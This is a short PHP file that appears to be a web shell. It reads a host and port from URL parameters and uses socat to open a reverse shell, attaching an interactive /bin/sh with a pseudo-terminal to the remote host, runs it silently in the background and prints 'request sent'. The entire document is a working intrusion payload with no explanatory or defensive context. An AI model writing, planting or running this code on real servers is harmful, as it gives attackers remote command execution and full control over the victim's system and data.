<?php
  exec('socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/sh,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &');
?>
request sent
